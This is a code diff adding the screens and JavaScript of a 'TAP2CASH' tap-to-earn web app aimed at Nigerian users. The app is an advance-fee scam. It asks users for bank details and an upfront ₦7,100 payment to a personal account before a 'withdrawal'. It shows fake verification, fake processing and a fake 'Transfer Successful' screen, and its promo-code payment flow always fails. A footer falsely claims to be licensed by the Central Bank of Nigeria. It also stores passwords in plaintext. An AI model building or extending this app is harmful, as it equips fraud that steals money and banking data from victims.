+                <div style="width:100%;height:8px;background:#1a237e;border-radius:99px;overflow:hidden">
+
+                    <div id="tapProgressBar" style="height:100%;width:0%;background:linear-gradient(90deg,#ffd700,#daa520);border-radius:99px;transition:width 0.2s ease"></div>
+
+                </div>
+
+            </div>
+
+
+
+            <!-- Stats grid -->
+
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;width:100%;margin-bottom:10px">
+
+                <div style="background:#1a237e;border-radius:14px;padding:14px;text-align:center;border:1.5px solid #ffd700">
+
+                    <div style="color:#888;font-size:11px;margin-bottom:4px;letter-spacing:.5px">COINS EARNED</div>
+
+                    <div style="color:#ffd700;font-size:26px;font-weight:900" id="balanceAmount">0</div>
+
+                    <div style="color:#555;font-size:11px">coins</div>
+
+                </div>
+
+                <div style="background:#1a237e;border-radius:14px;padding:14px;text-align:center;border:1.5px solid #00e676">
+
+                    <div style="color:#888;font-size:11px;margin-bottom:4px;letter-spacing:.5px">NAIRA VALUE</div>
+
+                    <div style="color:#00e676;font-size:26px;font-weight:900" id="nairaValueDisplay">0</div>
+
+                    <div style="color:#555;font-size:11px">naira</div>
+
+                </div>
+
+            </div>
+
+
+
+            <!-- Next coin countdown -->
+
+            <div style="width:100%;background:#1a237e;border-radius:14px;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;border:1px solid #283593">
+
+                <span style="color:#aaa;font-size:13px">Next coin in</span>
+
+                <span style="color:#ffd700;font-weight:700;font-size:15px" id="nextCoinLabel">10 more taps</span>
+
+            </div>
+
+        </div>
+
+
+            <!-- CBN Footer -->
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+        <div class="dash-bottom-nav">
+
+            <button class="nav-item active" onclick="switchTab('home', this)">
+
+                <div class="nav-icon">H</div>
+
+                <span class="nav-label">Home</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('contact', this)">
+
+                <div class="nav-icon">C</div>
+
+                <span class="nav-label">Contact</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('withdraw', this)">
+
+                <div class="nav-icon">W</div>
+
+                <span class="nav-label">Withdraw</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('history', this)">
+
+                <div class="nav-icon">📋</div>
+
+                <span class="nav-label">History</span>
+
+            </button>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- WITHDRAW SCREEN -->
+
+    <div id="withdrawScreen" class="withdraw-screen">
+
+        <div class="withdraw-header">
+
+            <button class="back-arrow" onclick="showDashboard()">←</button>
+
+            <div class="withdraw-title">WITHDRAWAL</div>
+
+            <button class="star-btn" onclick="showContactModal()">🎧</button>
+
+        </div>
+
+        <div class="withdraw-content">
+
+            <div class="withdraw-balance-card">
+
+                <div class="withdraw-balance-title">Available Balance</div>
+
+                <div class="withdraw-balance-divider"></div>
+
+                <div class="withdraw-balance-row">
+
+                    <div class="withdraw-balance-item">
+
+                        <div class="withdraw-balance-icon gold">N</div>
+
+                        <div>
+
+                            <span class="withdraw-balance-label">Coins: </span>
+
+                            <span class="withdraw-balance-value" id="withdrawCoinCount">0</span>
+
+                        </div>
+
+                    </div>
+
+                    <span class="withdraw-convert-text">Converting to</span>
+
+                    <div class="withdraw-balance-item">
+
+                        <div class="withdraw-balance-icon green">N</div>
+
+                        <div>
+
+                            <span class="withdraw-balance-label">Naira: </span>
+
+                            <span class="withdraw-balance-value green" id="withdrawNairaCount">0.00</span>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+
+
+            <div class="withdraw-form">
+
+                <div class="withdraw-input-group">
+
+                    <div class="withdraw-input-wrapper">
+
+                        <label class="withdraw-input-label">Bank Name</label>
+
+                        <input type="text" id="withdrawBankName" class="withdraw-input-field" placeholder="Enter bank name">
+
+                    </div>
+
+                </div>
+
+                <div class="withdraw-input-group">
+
+                    <div class="withdraw-input-wrapper">
+
+                        <label class="withdraw-input-label">Account Name</label>
+
+                        <input type="text" id="withdrawAccountName" class="withdraw-input-field" placeholder="Enter account name">
+
+                    </div>
+
+                </div>
+
+                <div class="withdraw-input-group">
+
+                    <div class="withdraw-input-wrapper">
+
+                        <label class="withdraw-input-label">Account Number</label>
+
+                        <input type="tel" id="withdrawAccountNumber" class="withdraw-input-field" placeholder="Enter account number">
+
+                    </div>
+
+                </div>
+
+                <div class="withdraw-input-group">
+
+                    <div class="withdraw-input-wrapper">
+
+                        <label class="withdraw-input-label">Amount</label>
+
+                        <input type="tel" id="withdrawAmount" class="withdraw-input-field" placeholder="Enter amount to withdraw">
+
+                    </div>
+
+                </div>
+
+            </div>
+
+
+
+            <button class="withdraw-btn" onclick="handleWithdraw()" id="withdrawBtn">WITHDRAW</button>
+
+        </div>
+
+        
+            <!-- CBN Footer -->
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+            <div class="dash-bottom-nav">
+
+            <button class="nav-item" onclick="switchTab('home', this)">
+
+                <div class="nav-icon">H</div>
+
+                <span class="nav-label">Home</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('contact', this)">
+
+                <div class="nav-icon">C</div>
+
+                <span class="nav-label">Contact</span>
+
+            </button>
+
+            <button class="nav-item active" onclick="switchTab('withdraw', this)">
+
+                <div class="nav-icon">W</div>
+
+                <span class="nav-label">Withdraw</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('history', this)">
+
+                <div class="nav-icon">📋</div>
+
+                <span class="nav-label">History</span>
+
+            </button>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- CONFIRM DETAILS SCREEN -->
+    <div id="confirmScreen" class="confirm-screen">
+        <div class="confirm-header">
+            <button class="confirm-back" onclick="showWithdrawScreen()">←</button>
+            <div class="confirm-header-title">CONFIRM DETAILS</div>
+            <button class="confirm-back" onclick="showContactModal()">🎧</button>
+        </div>
+        <div class="confirm-content">
+            <div class="details-card">
+                <div class="details-card-title">Withdrawal Details</div>
+                <div class="details-row">
+                    <span class="details-label">Bank Name:</span>
+                    <span class="details-value" id="confirmBank">—</span>
+                </div>
+                <div class="details-row">
+                    <span class="details-label">Account Name:</span>
+                    <span class="details-value" id="confirmAccName">—</span>
+                </div>
+                <div class="details-row">
+                    <span class="details-label">Account Number:</span>
+                    <span class="details-value" id="confirmAccNumber">—</span>
+                </div>
+                <div class="details-row">
+                    <span class="details-label">Amount:</span>
+                    <span class="details-value" style="color:#00e676;font-weight:700" id="confirmAmount">—</span>
+                </div>
+            </div>
+
+            <div class="processing-card">
+                <div class="processing-icon">₦</div>
+                <div class="processing-title">Converting to Naira...</div>
+                <div class="processing-text" id="typingText" style="min-height:60px"></div>
+                <div class="processing-dots" id="processingDots">
+                    <span></span><span></span><span></span><span></span><span></span>
+                </div>
+            </div>
+
+            <button class="proceed-btn" onclick="showPaymentScreen()" id="proceedBtn" style="display:none">PROCEED</button>
+        </div>
+        
+            <!-- CBN Footer -->
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+            <div class="dash-bottom-nav">
+            <button class="nav-item" onclick="switchTab('home', this)"><div class="nav-icon">H</div><span class="nav-label">Home</span></button>
+            <button class="nav-item" onclick="switchTab('contact', this)"><div class="nav-icon">C</div><span class="nav-label">Contact</span></button>
+            <button class="nav-item active" onclick="switchTab('withdraw', this)"><div class="nav-icon">W</div><span class="nav-label">Withdraw</span></button>
+            <button class="nav-item" onclick="switchTab('history', this)"><div class="nav-icon">📋</div><span class="nav-label">History</span></button>
+        </div>
+    </div>
+
+    <!-- PAYMENT SCREEN -->
+    <div id="paymentScreen" class="payment-screen">
+        <div class="payment-header">
+            <button class="payment-back" onclick="showConfirmScreen()">←</button>
+            <div class="payment-header-title">MAKE PAYMENT</div>
+            <button class="payment-back" onclick="showContactModal()">🎧</button>
+        </div>
+        <div class="payment-content">
+
+            <!-- Instruction -->
+            <div style="background:#1a237e;border-radius:10px;padding:10px 12px;border-left:4px solid #00e676;">
+                <div style="color:#00e676;font-size:12px;font-weight:700;margin-bottom:3px">📢 HOW TO COMPLETE YOUR WITHDRAWAL</div>
+                <div style="color:#ccc;font-size:11px;line-height:1.6">To convert your coins to Naira and have it sent to your bank, pay the amount below to the account provided. Once payment is made, upload your proof below so your withdrawal can be processed and sent to your bank successfully.</div>
+            </div>
+
+            <!-- Amount -->
+            <div style="background:#1a237e;border:2px solid #00e676;border-radius:10px;padding:6px;text-align:center;">
+                <div style="color:#aaa;font-size:9px;letter-spacing:.5px;margin-bottom:2px">AMOUNT TO PAY</div>
+                <div style="color:#00e676;font-size:24px;font-weight:900;line-height:1">₦ 7,100</div>
+                <div style="color:#666;font-size:10px;margin-top:2px">Pay this exact amount to the account below</div>
+            </div>
+
+            <!-- Pay to -->
+            <div style="background:#1a237e;border-radius:10px;border:1.5px solid #283593;margin-bottom:6px">
+                <div style="background:#283593;text-align:center;padding:7px;color:#fff;font-size:11px;font-weight:700;letter-spacing:1px">PAY TO THIS ACCOUNT</div>
+                <div style="padding:5px 10px;border-bottom:1px solid #283593;display:flex;justify-content:space-between;align-items:center">
+                    <span style="color:#888;font-size:11px">Bank</span>
+                    <span style="color:#fff;font-weight:700;font-size:12px">Paystack Titan</span>
+                </div>
+                <div style="padding:5px 10px;border-bottom:1px solid #283593;display:flex;justify-content:space-between;align-items:center">
+                    <span style="color:#888;font-size:11px">Account Name</span>
+                    <span style="color:#00e676;font-weight:700;font-size:12px">David</span>
+                </div>
+                <div style="padding:6px 12px;display:flex;justify-content:space-between;align-items:center">
+                    <span style="color:#888;font-size:11px">Account Number</span>
+                    <span style="color:#ffd700;font-weight:700;font-size:13px;letter-spacing:1px">9736975047</span>
+                </div>
+            </div>
+
+            <!-- Upload -->
+            <div style="background:#1a237e;border-radius:10px;border:1.5px solid #283593;overflow:hidden;">
+                <div style="background:#283593;text-align:center;padding:5px;color:#fff;font-size:11px;font-weight:700;letter-spacing:1px">UPLOAD PAYMENT PROOF</div>
+                <div style="padding:6px 10px;display:flex;flex-direction:column;align-items:center;gap:4px">
+                    <input type="file" id="receiptInput" accept="image/*" style="display:none" onchange="previewReceipt(event)">
+                    <img id="receiptPreview" style="width:100%;max-height:100px;object-fit:cover;border-radius:8px;display:none;border:2px solid #ffd700" alt="Receipt">
+                    <button onclick="document.getElementById('receiptInput').click()" style="width:100%;padding:10px;background:#283593;border:2px dashed #7986cb;border-radius:10px;color:#fff;font-size:12px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px" id="uploadCircle">
+                        <span style="font-size:15px">📷</span> Tap to upload receipt
+                    </button>
+                    <div id="uploadHint" style="color:#666;font-size:10px;text-align:center">Upload screenshot or photo of your payment</div>
+                    <div id="receiptFileName" style="color:#ffd700;font-size:10px;display:none"></div>
+                </div>
+            </div>
+
+            <!-- Submit -->
+            <button class="submit-btn" onclick="handleSubmitPayment()" style="padding:12px;font-size:14px;border-radius:12px">SUBMIT PROOF</button>
+
+        </div>
+        
+            <!-- CBN Footer -->
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+            <div class="dash-bottom-nav">
+            <button class="nav-item" onclick="switchTab('home', this)"><div class="nav-icon">H</div><span class="nav-label">Home</span></button>
+            <button class="nav-item" onclick="switchTab('contact', this)"><div class="nav-icon">C</div><span class="nav-label">Contact</span></button>
+            <button class="nav-item active" onclick="switchTab('withdraw', this)"><div class="nav-icon">W</div><span class="nav-label">Withdraw</span></button>
+            <button class="nav-item" onclick="switchTab('history', this)"><div class="nav-icon">📋</div><span class="nav-label">History</span></button>
+        </div>
+    </div>
+
+    <!-- HISTORY SCREEN -->
+
+    <div id="historyScreen" class="history-screen">
+
+        <div class="history-header">
+
+            <button class="back-arrow" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;" onclick="showDashboard()">←</button>
+
+            <div class="history-title">HISTORY</div>
+
+            <div style="width:36px"></div>
+
+        </div>
+
+        <div class="history-content" id="historyList">
+
+            <div class="history-empty">
+
+                <div class="history-empty-icon">📋</div>
+
+                <div>No activity yet</div>
+
+                <div style="font-size:13px;color:#333">Start tapping to earn coins!</div>
+
+            </div>
+
+        </div>
+
+        
+            <!-- CBN Footer -->
+            <div class="cbn-footer">
+                <div class="cbn-footer-line"></div>
+                <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+                <div class="cbn-footer-line"></div>
+            </div>
+            <div class="dash-bottom-nav">
+
+            <button class="nav-item" onclick="switchTab('home', this)">
+
+                <div class="nav-icon">H</div>
+
+                <span class="nav-label">Home</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('contact', this)">
+
+                <div class="nav-icon">C</div>
+
+                <span class="nav-label">Contact</span>
+
+            </button>
+
+            <button class="nav-item" onclick="switchTab('withdraw', this)">
+
+                <div class="nav-icon">W</div>
+
+                <span class="nav-label">Withdraw</span>
+
+            </button>
+
+            <button class="nav-item active" onclick="switchTab('history', this)">
+
+                <div class="nav-icon">📋</div>
+
+                <span class="nav-label">History</span>
+
+            </button>
+
+        </div>
+
+    </div>
+
+
+
+    <!-- LOADING OVERLAY -->
+
+    <div id="loadingOverlay" class="loading-overlay">
+
+        <div class="loading-spinner"></div>
+
+        <div class="loading-text">Verifying Payment...</div>
+
+    </div>
+
+
+
+    <!-- CONTACT MODAL -->
+
+    <div id="contactModal" class="modal-overlay" onclick="hideContactModal(event)">
+
+        <div class="modal-box" onclick="event.stopPropagation()" style="padding:0;overflow:hidden;border-radius:20px;background:#0f1629;border:1px solid #1a237e">
+
+            <!-- Header -->
+            <div style="background:linear-gradient(135deg,#1a237e,#283593);padding:24px 20px 20px;text-align:center">
+                <div style="font-size:40px;margin-bottom:8px">🎧</div>
+                <div style="font-size:20px;font-weight:800;color:#fff;letter-spacing:1px">Customer Support</div>
+                <div style="font-size:13px;color:rgba(255,255,255,0.6);margin-top:4px">We're here to help you 24/7</div>
+            </div>
+
+            <!-- Body -->
+            <div style="padding:20px">
+
+                <!-- Info text -->
+                <div style="background:rgba(255,167,38,0.1);border:1px solid rgba(255,167,38,0.3);border-radius:12px;padding:14px;margin-bottom:16px;font-size:13px;color:#ffa726;line-height:1.6;text-align:center">
+                    ⚠️ Having issues with your <strong>promo code</strong> or a <strong>failed transfer</strong>? Tap the button below to email us directly and we'll resolve it for you.
+                </div>
+
+                <!-- Gmail button -->
+                <a href="mailto:tap2cash2026@gmail.com?subject=TAP2CASH%20Support%20Request&body=Hello%20TAP2CASH%20Support%2C%0A%0AI%20need%20help%20with%3A%0A%0A(Please%20describe%20your%20issue%20here)" 
+                   style="display:flex;align-items:center;gap:14px;background:linear-gradient(135deg,#ea4335,#c62828);border-radius:14px;padding:16px 18px;text-decoration:none;margin-bottom:12px;box-shadow:0 4px 15px rgba(234,67,53,0.35)">
+                    <div style="width:42px;height:42px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0">📧</div>
+                    <div>
+                        <div style="color:#fff;font-weight:700;font-size:15px">Email Us on Gmail</div>
+                        <div style="color:rgba(255,255,255,0.8);font-size:12px;margin-top:2px">tap2cash2026@gmail.com</div>
+                        <div style="color:rgba(255,255,255,0.6);font-size:11px;margin-top:1px">Tap to open Gmail directly →</div>
+                    </div>
+                </a>
+
+                <!-- Response time note -->
+                <div style="text-align:center;font-size:12px;color:rgba(255,255,255,0.4);margin-bottom:16px">
+                    ⏱ Average response time: <strong style="color:rgba(255,255,255,0.6)">under 10 minutes</strong>
+                </div>
+
+                <button class="modal-close" onclick="hideContactModal()" style="width:100%;padding:14px;border-radius:12px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);color:#fff;font-size:14px;font-weight:600;cursor:pointer">Close</button>
+            </div>
+
+        </div>
+
+    </div>
+
+
+
+
+    <!-- PROCESSING SCREEN -->
+    <div id="processingScreen" class="processing-screen">
+        <div style="font-size:13px;color:#888;margin-bottom:24px;letter-spacing:1px;text-transform:uppercase">Processing Withdrawal</div>
+
+        <div class="proc-step" id="procStep1">
+            <div class="proc-icon">🧾</div>
+            <div class="proc-text">Confirming the receipt...</div>
+            <div class="proc-status" id="procStatus1"></div>
+        </div>
+
+        <div class="proc-step" id="procStep2">
+            <div class="proc-icon">🔄</div>
+            <div class="proc-text">Converting coins to Naira...</div>
+            <div class="proc-status" id="procStatus2"></div>
+        </div>
+
+        <div class="proc-step" id="procStep3">
+            <div class="proc-icon">📤</div>
+            <div class="proc-text" id="procStep3Text">Sending to your bank...</div>
+            <div class="proc-status" id="procStatus3"></div>
+        </div>
+
+        <div style="margin-top:20px;font-size:12px;color:#555;text-align:center">Please wait, do not close this page</div>
+    </div>
+
+    <!-- SUCCESS SCREEN -->
+    <div id="successScreen" class="success-screen">
+        <div class="success-checkmark">✓</div>
+        <div class="success-title">Transfer Successful!</div>
+        <div class="success-amount" id="successAmount">₦0</div>
+        <div class="success-bank" id="successBank">Sent to your bank</div>
+        <div class="success-info-box">
+            <p>Your withdrawal has been processed successfully. Your money will arrive in your bank account in <strong>less than 3 minutes</strong>. Please check your bank account or mobile app for the credit alert.</p>
+        </div>
+        <div class="cbn-footer" style="margin-bottom:16px;width:100%">
+            <div class="cbn-footer-line"></div>
+            <div class="cbn-footer-text">🇳🇬 RC: 7829341 &nbsp;|&nbsp; Licensed by CBN &nbsp;|&nbsp; © 2026 TAP2CASH Nigeria Ltd.</div>
+            <div class="cbn-footer-line"></div>
+        </div>
+        <button class="success-home-btn" onclick="goHomeFromSuccess()">BACK TO HOME</button>
+    </div>
+
+    <!-- Toast -->
+
+    <div class="toast" id="toast"></div>
+
+</div>
+
+
+
+<script>
+
+const VALID_PROMO = '1549';
+
+const TAPS_PER_COIN = 10;
+
+const NAIRA_PER_COIN = 120;
+
+
+
+let users = {};
+try { users = JSON.parse(localStorage.getItem('tap2cash_users')) || {}; } catch(e) { users = {}; localStorage.removeItem('tap2cash_users'); }
+
+let currentUser = null;
+
+let promoCode = '';
+
+let coinCount = 0;
+
+let nairaBalance = 0;
+
+let tapCount = 0;
+
+let txHistory = [];
+
+
+
+function saveUsers() {
+
+    localStorage.setItem('tap2cash_users', JSON.stringify(users));
+
+}
+
+
+
+function showAuthScreen(screenId) {
+
+    const loginScreen = document.getElementById('loginScreen');
+
+    const signupScreen = document.getElementById('signupScreen');
+
+    if (screenId === 'signupScreen') {
+
+        loginScreen.classList.add('hidden-left');
+
+        signupScreen.classList.remove('hidden-right');
+
+    } else {
+
+        loginScreen.classList.remove('hidden-left');
+
+        signupScreen.classList.add('hidden-right');
+
+        document.getElementById('loginMessage').className = 'message';
+
+        document.getElementById('loginMessage').textContent = '';
+
+    }
+
+}
+
+
+
+function togglePassword(inputId, btn) {
+
+    const input = document.getElementById(inputId);
+
+    if (input.type === 'password') {
+
+        input.type = 'text';
+
+        btn.textContent = '🙈';
+
+    } else {
+
+        input.type = 'password';
+
+        btn.textContent = '👁';
+
+    }
+
+}
+
+
+
+function showMessage(elementId, text, type) {
+
+    const el = document.getElementById(elementId);
+
+    el.textContent = text;
+
+    el.className = 'message ' + type;
+
+    setTimeout(() => { el.className = 'message'; }, 5000);
+
+}
+
+
+
+function validatePhone(phone) {
+
+    const cleaned = phone.replace(/\D/g, '');
+
+    return cleaned.length === 11 && cleaned.startsWith('0');
+
+}
+
+
+
+function handleSignup() {
+
+    const firstName = document.getElementById('firstName').value.trim();
+
+    const lastName = document.getElementById('lastName').value.trim();
+
+    const phone = document.getElementById('signupPhone').value.trim();
+
+    const password = document.getElementById('signupPassword').value;
+
+    const confirmPass = document.getElementById('confirmPassword').value;
+
+    const btn = document.getElementById('signupBtn');
+
+
+
+    if (!firstName || !lastName) {
+
+        showMessage('signupMessage', 'Please enter your first and last name.', 'error');
+
+        return;
+
+    }
+
+    if (!validatePhone(phone)) {
+
+        showMessage('signupMessage', 'Please enter a valid Nigerian phone number (11 digits starting with 0).', 'error');
+
+        return;
+
+    }
+
+    if (password.length < 6) {
+
+        showMessage('signupMessage', 'Password must be at least 6 characters.', 'error');
+
+        return;
+
+    }
+
+    if (password !== confirmPass) {
+
+        showMessage('signupMessage', 'Passwords do not match.', 'error');
+
+        return;
+
+    }
+
+    const normalizedPhone = phone.replace(/\D/g, '');
+
+    if (users[normalizedPhone]) {
+
+        showMessage('signupMessage', 'This phone number is already registered. Please login instead.', 'error');
+
+        return;
+
+    }
+
+
+
+    btn.innerHTML = 'CREATING... <span class="spinner"></span>';
+
+    btn.disabled = true;
+
+
+
+    setTimeout(() => {
+
+        users[normalizedPhone] = {
+
+            firstName, lastName, phone: normalizedPhone, password: password,
+
+            createdAt: new Date().toISOString()
+
+        };
+
+        saveUsers();
+
+        btn.innerHTML = 'CREATE ACCOUNT';
+
+        btn.disabled = false;
+
+        showToast('Account created successfully!', 'success');
+
+        document.getElementById('firstName').value = '';
+
+        document.getElementById('lastName').value = '';
+
+        document.getElementById('signupPhone').value = '';
+
+        document.getElementById('signupPassword').value = '';
+
+        document.getElementById('confirmPassword').value = '';
+
+        setTimeout(() => showAuthScreen('loginScreen'), 1000);
+
+    }, 1500);
+
+}
+
+
+
+function handleLogin() {
+
+    const phone = document.getElementById('loginPhone').value.trim();
+
+    const password = document.getElementById('loginPassword').value;
+
+    const btn = document.getElementById('loginBtn');
+
+
+
+    if (!validatePhone(phone)) {
+
+        showMessage('loginMessage', 'Please enter a valid phone number.', 'error');
+
+        return;
+
+    }
+
+    if (!password) {
+
+        showMessage('loginMessage', 'Please enter your password.', 'error');
+
+        return;
+
+    }
+
+    const normalizedPhone = phone.replace(/\D/g, '');
+
+
+
+    btn.innerHTML = 'LOGGING IN... <span class="spinner"></span>';
+
+    btn.disabled = true;
+
+
+
+    setTimeout(() => {
+
+        const user = users[normalizedPhone];
+
+        if (!user) {
+
+            showMessage('loginMessage', 'No account found with this number. Please sign up first.', 'error');
+
+            btn.innerHTML = 'LOGIN';
+
+            btn.disabled = false;
+
+            return;
+
+        }
+
+        if (user.password !== password) {
+
+            showMessage('loginMessage', 'Incorrect password. Please try again.', 'error');
+
+            btn.innerHTML = 'LOGIN';
+
+            btn.disabled = false;
+
+            return;
+
+        }
+
+        currentUser = user;
+
+        btn.innerHTML = 'LOGIN';
+
+        btn.disabled = false;
+
+        showToast('Welcome back, ' + user.firstName + '!', 'success');
+
+        setTimeout(() => {
+
+            document.getElementById('loginScreen').style.display = 'none';
+
+            document.getElementById('signupScreen').style.display = 'none';
+
+            document.getElementById('promoScreen').classList.add('active');
+
+        }, 800);
+
+    }, 1000);
+
+}
+
+
+
+function logout() {
+
+    currentUser = null;
+
+    promoCode = '';
+
+    txHistory = [];
+
+    updatePromoDisplay();
+
+    document.getElementById('promoScreen').classList.remove('active');
+
+    document.getElementById('buyScreen').classList.remove('active');
+
+    document.getElementById('failedScreen').classList.remove('active');
+
+    document.getElementById('dashboardScreen').classList.remove('active');
+
+    document.getElementById('withdrawScreen').classList.remove('active');
+
+    document.getElementById('historyScreen').classList.remove('active');
+
+    document.getElementById('confirmScreen').classList.remove('active');
+
+    document.getElementById('paymentScreen').classList.remove('active');
+
+    document.getElementById('loginScreen').style.display = 'flex';
+
+    document.getElementById('loginPhone').value = '';
+
+    document.getElementById('loginPassword').value = '';
+
+    showAuthScreen('loginScreen');
+
+}
+
+
+
+function enterDigit(digit) {
+
+    if (promoCode.length < 6) {
+
+        promoCode += digit;
+
+        updatePromoDisplay();
+
+    }
+
+}
+
+
+
+function backspace() {
+
+    promoCode = promoCode.slice(0, -1);
+
+    updatePromoDisplay();
+
+}
+
+
+
+function clearPromoCode() {
+
+    promoCode = '';
+
+    updatePromoDisplay();
+
+}
+
+
+
+function updatePromoDisplay() {
+
+    const display = document.getElementById('promoCodeDisplay');
+
+    const box = document.getElementById('promoCodeBox');
+
+    if (promoCode.length === 0) {
+
+        display.textContent = 'Enter promo code';
+
+        display.className = 'promo-code-placeholder';
+
+        box.classList.remove('has-code');
+
+    } else {
+
+        display.textContent = promoCode;
+
+        display.className = 'promo-code-value';
+
+        box.classList.add('has-code');
+
+    }
+
+}
+
+
+
+function promoLogin() {
+
+    const btn = document.getElementById('promoLoginBtn');
+
+    if (promoCode !== VALID_PROMO) {
+
+        showToast('Invalid promo code. Try again.', '');
+
+        return;
+
+    }
+
+    btn.innerHTML = 'VERIFYING... <span class="spinner"></span>';
+
+    btn.disabled = true;
+
+    setTimeout(() => {
+
+        btn.innerHTML = 'LOGIN';
+
+        btn.disabled = false;
+
+        showToast('Promo code verified! Welcome to TAP2CASH.', 'success');
+
+        setTimeout(() => {
+
+            document.getElementById('promoScreen').classList.remove('active');
+
+            document.getElementById('dashboardScreen').classList.add('active');
+
+            resetDashboard();
+
+        }, 500);
+
+    }, 1200);
+
+}
+
+
+
+function showBuyScreen() {
+
+    document.getElementById('buyScreen').classList.add('active');
+
+}
+
+
+
+function showPromoScreen() {
+
+    document.getElementById('buyScreen').classList.remove('active');
+
+}
+
+
+
+function copyAccount() {
+
+    const num = '6092973068';
+
+    navigator.clipboard.writeText(num).then(() => {
+
+        const btn = document.getElementById('copyBtn');
+
+        btn.textContent = 'Copied!';
+
+        btn.classList.add('copied');
+
+        showToast('Account number copied!', 'success');
+
+        setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+
+    }).catch(() => {
+
+        const textArea = document.createElement('textarea');
+
+        textArea.value = num;
+
+        document.body.appendChild(textArea);
+
+        textArea.select();
+
+        document.execCommand('copy');
+
+        document.body.removeChild(textArea);
+
+        showToast('Account number copied!', 'success');
+
+    });
+
+}
+
+
+
+function processPayment() {
+
+    const overlay = document.getElementById('loadingOverlay');
+
+    overlay.classList.add('active');
+
+    setTimeout(() => {
+
+        overlay.classList.remove('active');
+
+        document.getElementById('buyScreen').classList.remove('active');
+
+        document.getElementById('failedScreen').classList.add('active');
+
+    }, 3000);
+
+}
+
+
+
+function retryPayment() {
+
+    document.getElementById('failedScreen').classList.remove('active');
+
+    document.getElementById('buyScreen').classList.add('active');
+
+}
+
+
+
+function backToBuy() {
+
+    document.getElementById('failedScreen').classList.remove('active');
+
+    document.getElementById('buyScreen').classList.add('active');
+
+}
+
+
+
+function backToPromo() {
+
+    document.getElementById('failedScreen').classList.remove('active');
+
+    document.getElementById('promoScreen').classList.add('active');
+
+}
+
+
+
+function resetDashboard() {
+
+    // Load saved progress for this user, or start fresh
+
+    coinCount = currentUser.coinCount || 0;
+
+    nairaBalance = currentUser.nairaBalance || 0;
+
+    txHistory = currentUser ? (currentUser.txHistory || []) : (JSON.parse(sessionStorage.getItem('tap2cash_txHistory') || '[]'));
+
+    tapCount = 0;
+
+    updateDashboard();
+
+}
+
+
+
+function resumePayment(historyIndex) {
+    var tx = txHistory[historyIndex];
+    if (!tx || tx.status !== 'processing') return;
+    pendingWithdrawal = Object.assign({}, tx.pendingWithdrawal);
+    // Hide all screens then show payment
+    document.querySelectorAll('.screen, .dashboard-screen').forEach(function(s) { s.classList.remove('active'); });
+    document.getElementById('paymentScreen').classList.add('active');
+    document.getElementById('paymentAmountDisplay').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+}
+
+function addHistory(type, title, amount) {
+
+    const now = new Date();
+
+    const timeStr = now.toLocaleDateString('en-NG', {day:'2-digit',month:'short'}) + ' ' +
+
+        now.toLocaleTimeString('en-NG', {hour:'2-digit',minute:'2-digit',hour12:true});
+
+    txHistory.unshift({ type, title, amount, time: timeStr });
+
+    if (currentUser) {
+
+        currentUser.txHistory = txHistory;
+
+        users[currentUser.phone] = currentUser;
+
+        saveUsers();
+
+    }
+
+}
+
+
+
+function renderHistory() {
+
+    const list = document.getElementById('historyList');
+
+    if (!txHistory || txHistory.length === 0) {
+
+        list.innerHTML = '<div class="history-empty"><div class="history-empty-icon">📋</div><div>No activity yet</div><div style="font-size:13px;color:#333">Complete a withdrawal to see your history!</div></div>';
+
+        return;
+
+    }
+
+    list.innerHTML = txHistory.map(function(tx, i) {
+        var isProcessing = tx.status === 'processing';
+        var isSubmitted = tx.status === 'submitted';
+        var icon = isProcessing ? '⏳' : isSubmitted ? '📤' : '💸';
+        var amountColor = isProcessing ? 'withdraw' : isSubmitted ? 'withdraw' : 'withdraw';
+        var statusBadge = isProcessing
+            ? '<div style="font-size:11px;color:#ffa726;font-weight:500;margin-top:4px;line-height:1.6">⏳ <em>Payment pending. Tap here to complete your payment and have your coins converted to Naira and sent to your bank account.</em></div>'
+            : isSubmitted
+            ? '<div style="font-size:10px;color:#4fc3f7;font-weight:700;margin-top:2px">📤 Payment Submitted — Your account will be credited shortly.</div>'
+            : '';
+        var clickAttr = isProcessing ? 'onclick="resumePayment(' + i + ')" style="cursor:pointer;border-color:#ffa726"' : '';
+        return '<div class="history-item" ' + clickAttr + '>' +
